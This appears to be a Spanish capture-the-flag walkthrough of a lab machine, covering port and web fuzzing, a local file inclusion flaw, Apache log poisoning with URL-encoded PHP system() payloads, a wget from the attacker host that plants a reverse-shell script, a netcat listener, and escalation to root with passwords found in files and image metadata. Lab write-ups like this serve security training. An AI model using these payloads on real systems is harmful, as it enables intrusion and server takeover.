@@ -1,0 +1,238 @@
+# Enumeracion de Puertos, Servicios y versiones
+
+nmap -Pn -n -sS -p- -sV --script vuln --open --min-rate 5000 -vvv -oN nmap 172.17.0.2
+
+22/tcp open  ssh     syn-ack ttl 64 OpenSSH 7.6p1 Ubuntu 3ubuntu13 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.58 ((Ubuntu))
+
+
+# Fuzzing web
+
+gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -t 50 -x php,txt,html,py,js,png,jpg > report-gobuster
+
+/.html                (Status: 403) [Size: 275]
+/uploads              (Status: 301) [Size: 310] [--> http://172.17.0.2/uploads/]
+/index.html           (Status: 200) [Size: 10671]
+/.php                 (Status: 403) [Size: 275]
+/problems.php         (Status: 200) [Size: 10671]
+/.php                 (Status: 403) [Size: 275]
+/.html                (Status: 403) [Size: 275]
+/server-status        (Status: 403) [Size: 275]
+
+chequeamos los directorios pero no conseguimos nada, asi que probaremos un LFI (Local File Inclusion)
+
+wfuzz -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u 'http://172.17.0.2/problems.php/?FUZZ=/.../../../../../../etc/passwd' 
+--hl 363
+
+000007815:   200        25 L     32 W       1245 Ch     "backdoor"                                                                                             
+
+
+ahora podemos leer archivos del sistema, comenzaremos leyendo /etc/passwd
+
+curl http://172.17.0.2/problems.php/?backdoor=/etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
+systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
+systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
+messagebus:x:100:101::/nonexistent:/usr/sbin/nologin
+systemd-resolve:x:996:996:systemd Resolver:/:/usr/sbin/nologin
+sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
+carlos:x:1001:1001:,,,:/home/carlos:/bin/bash
+
+ya que conseguimos un usuarios del sistema <carlos> y el servicio ssh corriendo, probamos un ataque por diccionario
+pero no funciono, asi que seguiremos buscando que mas archivos pordemos leer en el sistema
+
+
+wfuzz -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u http://172.17.0.2/problems.php?backdoor=FUZZ --hc 404 --hw 0
+.
+.
+.
+.
+.
+/var/log/apache2/error.log
+
+tenemos acceso un log del servicio web (error.log), por lo que intentaremos envenenar este log para colarnos una reverse shell.
+el envenamiento de este log ocurre cuando introducimos un error y este se registra en /var/log/apache2/error.log, y aprovechamos
+este comportamiento para inyectar codigo malicioso en el registro..
+
+abrimos desde el navegador el error.log:
+http://172.17.0.2/problems.php?backdoor=/var/log/apache2/error.log
+
+ahora vamos a solicitar un archivo que no existe para que veamos el comportamiento
+
+curl http://172.17.0.2/prueba.php			
+
+enviamos la solicitud (con curl) y refrescamos la web en : http://172.17.0.2/problems.php?backdoor=/var/log/apache2/error.log
+tuvo que registrar la solicitud que hicimos, de esto nos vamos aprovechar paraa envenenar el registro con codigo malicioso php
+
+curl http://172.17.0.2/<?php system('id') ?>.php		| asi debemos hacer el envenenamiento de error.log con codigo php
+								| malicioso
+
+debemos urlencodear >>>>> <?php system('id') ?>.php <<<<< para que pueda ser interpretado por el navegador
+
+curl http://172.17.0.2/%3C%3Fphp%20system(%27id%27)%20%3F%3E.php
+
+ahora refrescamos error.log desde el navegador y observamos:
+---------------------------------------------------------------------------------------------------------------
+script '/var/www/html/uid=33(www-data) gid=33(www-data) groups=33(www-data) .php' not found or unable to stat 
+---------------------------------------------------------------------------------------------------------------
+tenemos ejecucion de comandos a traves del envenamiento de error.log asi que ahora vamos a cargar un script php
+que nos envie una reverse shell.
+
+nuestro script.php lo vamos a renombrar a index.html y levantaremos un servidor con python por el puerto 80.
+
+ahora vamos a descargar en el servidor web en uploads el index.html que tenemos levantado con python, una vez 
+descargado le cambiamos el nombre a script.php, quedaria asi:
+
+
+<?php system('cd uploads;wget 172.17.0.1;mv index.html script.php') ?>.php
+
+cd uploads					|accedemos a uploads
+wget 172.17.0.1					|descargamos el index.html que levantamos con python
+mv index.html script.php			|renombramos a index.html como script.php
+
+ahora lo urlencodeamos:
+%3C%3Fphp%20system(%27cd%20uploads%3Bwget%20172.17.0.1%3Bmv%20index.html%20script.php%27)%20%3F%3E.php
+
+y procedemos a inyectar el comando a error.log (puede ser a traves de la web o con curl)
+
+curl "http://172.17.0.2/%3C%3Fphp%20system(%27cd%20uploads%3Bwget%20172.17.0.1%3Bmv%20index.html%20script.php%27)%20%3F%3E.php"
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>404 Not Found</title>
+</head><body>
+<h1>Not Found</h1>
+<p>The requested URL was not found on this server.</p>
+<hr>
+<address>Apache/2.4.58 (Ubuntu) Server at 172.17.0.2 Port 80</address>
+</body></html>
+------------------------------------------------------------------------------
+
+ahora nos vamos al navegar y refrescamos http://172.17.0.2/problems.php?backdoor=/var/log/apache2/error.log
+y nos vamos a http://172.17.0.2/uploads/ donde veremos el script.php
+
+nota: el script que use esta aqui -----> https://github.com/DarksBlackSk/reverse/blob/main/php-reverse-shell.php
+
+me pondre en escucha con netcat para luego llamar a script.php
+
+nc -lvnp 4444
+Listening on 0.0.0.0 4444
+Connection received on 172.17.0.2 57040
+Linux 6317f8b3e7eb 6.8.11-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.8.11-1kali2 (2024-05-30) x86_64 x86_64 x86_64 GNU/Linux
+ 09:56:35 up  9:44,  0 user,  load average: 0.56, 0.54, 0.34
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ 
+
+
+# Escalada de Privilegios
+
+script /dev/null -c bash
+stty raw -echo; fg
+reset xterm
+stty rows 38 columns 168
+export TERM=xterm
+export SHELL=bash
+
+sudo -l					| no podemos ejecutar sudo
+find / 2>&1 |grep .txt			| busqueda en el sistema de archivos .txt
+.
+.
+.
+/var/www/html/antiguo_y_fuerte.txt	| el mas llamativo del resto
+
+cat /var/www/html/antiguo_y_fuerte.txt
+Es imposible que me acuerde de la pass es inhackeable pero se que la tenpo en el mismo fichero desde fa 24 anys. trobala buscala
+soy el unico user del sistema.
+
+find / -type f -perm -o+r 2>/dev/null |grep .txt		| hacemos una nueva busqueda en el sistema
+.
+.
+.
+/usr/share/viejuno/inhackeable_pass.txt				| parece que lo conseguimos
+cat /usr/share/viejuno/inhackeable_pass.txt
+pinguinochocolatero
+
+su carlos
+passwd: pinguinochocolatero
+
+-----------------------------
+ahora somo el usuario carlos|
+-----------------------------
+
+sudo -l								| no podemos
+cd ~
+ls
+
+97 carpetas							| jajaja
+find /home/carlos/ -type f					| buscamos archivos comunes
+/home/carlos/.bashrc
+/home/carlos/.profile
+/home/carlos/.bash_logout
+/home/carlos/carpeta55/.toor.jpg
+
+cp /home/carlos/carpeta55/.toor.jpg toor.jpg			| copiamos la imagen a nuestro directorio actual
+python3 -m http.server 8000					| para descargaar la img a nuestra maquina y examinarla
+
+-------------------------------------------------------------------------------------------------------------------------
+
+desde nuestra maquina atacante:
+
+curl -O http://172.17.0.2:8000/toor.jpg
+exiftool toor.jpg
+-------------------------------------------------------------------
+ExifTool Version Number         : 12.76
+File Name                       : toor.jpg
+Directory                       : .
+File Size                       : 628 kB
+File Modification Date/Time     : 2024:09:08 20:21:54-04:00
+File Access Date/Time           : 2024:09:08 20:22:09-04:00
+File Inode Change Date/Time     : 2024:09:08 20:21:54-04:00
+File Permissions                : -rw-rw-r--
+File Type                       : JPEG
+File Type Extension             : jpg
+MIME Type                       : image/jpeg
+JFIF Version                    : 1.01
+Resolution Unit                 : None
+X Resolution                    : 1
+Y Resolution                    : 1
+Image Quality                   : pingui1730
+Image Width                     : 2048
+Image Height                    : 2048
+Encoding Process                : Baseline DCT, Huffman coding
+Bits Per Sample                 : 8
+Color Components                : 3
+Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
+Image Size                      : 2048x2048
+Megapixels                      : 4.2
+---------------------------------------------------------------------
+
+si detallamos los metadatos de la imagen nos conseguimos con:
+Image Quality                   : pingui1730
+
+pudiera ser la password de root asi que probaremos
+
+----------------------------------------------------------------------
+
+su root
+pass:pingui1730
+
+#root
